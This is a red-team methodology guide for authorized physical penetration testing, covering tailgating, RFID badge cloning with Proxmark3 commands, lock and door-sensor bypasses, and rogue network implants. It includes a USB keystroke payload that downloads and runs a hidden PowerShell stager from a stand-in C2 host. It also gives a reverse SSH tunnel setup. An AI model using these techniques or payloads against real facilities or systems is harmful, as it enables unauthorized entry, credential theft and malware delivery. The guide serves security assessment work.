---
name: performing-physical-intrusion-assessment
description: Conduct authorized physical penetration testing using tailgating, badge cloning, lock bypassing, and rogue device deployment to evaluate facility security controls.
domain: cybersecurity
subdomain: red-teaming
tags: [physical-security, red-team, tailgating, badge-cloning, lock-picking, rfid, physical-pentest]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Performing Physical Intrusion Assessment

## Overview

Physical intrusion assessment evaluates an organization's physical security controls by attempting to gain unauthorized access to facilities, server rooms, and restricted areas. This includes tailgating employees, cloning RFID access badges, bypassing locks, deploying rogue network devices, and testing security guard procedures. Physical security testing is a critical component of full-scope red team engagements, as it often provides the most direct path to network access. MITRE ATT&CK maps physical access techniques under T1200 (Hardware Additions) and T1091 (Replication Through Removable Media).

## Prerequisites

- Signed authorization letter (carry at all times during assessment)
- Emergency contact for client security team (24/7)
- Get-out-of-jail letter signed by executive authority
- Physical security testing toolkit
- Body camera or documentation equipment
- Disguise/cover identity materials (uniform, badge, clipboard)

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|---|---|---|
| T1200 | Hardware Additions | Initial Access |
| T1091 | Replication Through Removable Media | Initial Access |
| T1199 | Trusted Relationship | Initial Access |
| T1078 | Valid Accounts | Initial Access |

## Physical Security Testing Toolkit

| Tool | Purpose | Approximate Cost |
|---|---|---|
| Proxmark3 RDV4 | RFID badge cloning (125kHz/13.56MHz) | $300 |
| Flipper Zero | Multi-protocol RF analysis | $170 |
| Lock pick set (Sparrows) | Mechanical lock bypassing | $35 |
| Under-door tool (UDT) | Bypass door from outside | $30 |
| Shove knife / latch slip | Spring bolt bypass | $15 |
| LAN Turtle | Rogue network implant | $60 |
| WiFi Pineapple | Rogue wireless AP | $100 |
| Rubber Ducky / Bash Bunny | USB keystroke injection | $50-80 |
| Clipboard + hard hat + hi-vis | Social engineering props | $20 |
| Body camera | Evidence documentation | $50 |

## Technique 1: Tailgating

Tailgating involves following an authorized person through a secured entry point without presenting credentials.

**Methods:**
- **Hands full approach**: Carry boxes/equipment, ask someone to hold the door
- **Smoke break return**: Wait near smoking area, follow employees back inside
- **Delivery driver**: Wear delivery uniform, carry packages
- **Busy entrance timing**: Enter during shift change or lunch rush
- **Door propping**: Observe if employees prop doors open

**Countermeasures to test:**
- Turnstiles / mantraps
- Security guard challenge procedures
- Piggybacking detection systems
- Employee security awareness

## Technique 2: Badge Cloning

```bash
# Proxmark3 - Read a low-frequency (125kHz) HID card
proxmark3> lf hid read
# Output: HID Prox TAG ID: 2006xxxxxx - FC: 123 CN: 45678

# Clone to a T5577 blank card
proxmark3> lf hid clone --fc 123 --cn 45678

# Read high-frequency (13.56MHz) MIFARE card
proxmark3> hf mf rdbl --blk 0 -k FFFFFFFFFFFF

# Long-range capture with custom antenna (up to 3 feet)
proxmark3> lf hid read  # with extended antenna

# Flipper Zero - Read and emulate
# RFID > Read > Hold card to Flipper > Save > Emulate
```

**Badge cloning attack flow:**
1. Position near badge reader (elevator, door entry)
2. Read badge wirelessly as employee passes (1-3 second window)
3. Clone to blank card
4. Use cloned badge to access secured areas
5. Document which areas were accessible

## Technique 3: Lock Bypassing

| Lock Type | Bypass Method | Difficulty |
|---|---|---|
| Pin tumbler (standard) | Pick, rake, or bump key | Easy-Medium |
| Wafer lock (filing cabinets) | Pick or jiggle | Easy |
| Tubular lock (vending, server) | Tubular pick tool | Easy |
| Electronic lock (keypad) | Shoulder surf, thermal camera | Medium |
| Magnetic lock (mag lock) | Under-door tool, REX sensor bypass | Medium |
| Smart lock (Bluetooth) | Replay attack, firmware exploit | Hard |

```bash
# Electronic keypad - thermal imaging after use
# Warmer keys = more recently pressed
# Use FLIR camera to capture heat signatures within 30 seconds

# REX (Request to Exit) sensor bypass
# Insert thin wire or use a can of compressed air to trigger motion sensor
# on the inside of a mag-locked door
```

## Technique 4: Rogue Device Deployment

```bash
# LAN Turtle - Plug into exposed Ethernet port
# Provides SSH reverse tunnel back to C2 server
# Auto-configures as man-in-the-middle

# Configure LAN Turtle for reverse SSH
# Module: AutoSSH
# Host: c2.redteam.com
# Port: 22
# Remote port: 2222

# WiFi Pineapple - Deploy in common area
# Captures wireless credentials via evil twin attack
# Exfiltrates data over cellular modem

# USB Rubber Ducky - Drop in parking lot or leave on desk
# Payload: Download and execute C2 agent
# Duckyscript:
# DELAY 1000
# GUI r
# DELAY 500
# STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://c2.redteam.com/stager.ps1')"
# ENTER
```

## Technique 5: Dumpster Diving

Search external waste containers and recycling bins for:
- Printed documents with sensitive information
- Employee directories and org charts
- Network diagrams and IP addresses
- Shredded documents (cross-cut vs strip-cut assessment)
- Discarded hardware (hard drives, USB drives)

## Assessment Methodology

### Pre-Assessment Reconnaissance
1. Perimeter walk - identify all entry points, cameras, guard posts
2. Observe employee patterns - shift changes, break schedules
3. Identify badge technology (HID, MIFARE, iCLASS)
4. Map camera coverage and blind spots
5. Note security guard patrol routes and timing

### Execution Phases
1. **External perimeter**: Fencing, gates, parking barriers
2. **Building entry**: Main entrance, side doors, loading dock
3. **Internal access**: Floor access, elevator controls
4. **Restricted areas**: Server rooms, executive offices, data centers
5. **Device deployment**: Network implants, rogue wireless

### Documentation Requirements
- Timestamp and location for every access attempt
- Photos/video of successful entries
- Badge reader locations that accepted cloned credentials
- Unlocked doors, propped doors, tailgating opportunities
- Network ports accessible in public areas
- Evidence of data in waste containers

## Ethical and Safety Considerations

1. **Always carry authorization letter** - Be prepared to identify yourself immediately if confronted
2. **Never force entry** - If a technique damages property, document and skip
3. **Immediate stop** if law enforcement is called before deconfliction
4. **Never photograph individuals** without authorization
5. **Document, don't exploit** - Take photos as evidence, don't steal actual data
6. **Safety first** - Do not enter hazardous areas or bypass fire safety

## References

- ISACA Physical Penetration Testing White Paper (2023)
- ASIS Physical Security Professional (PSP) guidelines
- NIST SP 800-116 Rev. 1: Smart Card PIV guidelines
- Deviant Ollam - Physical Security Assessment methodology
- MITRE ATT&CK T1200: https://attack.mitre.org/techniques/T1200/
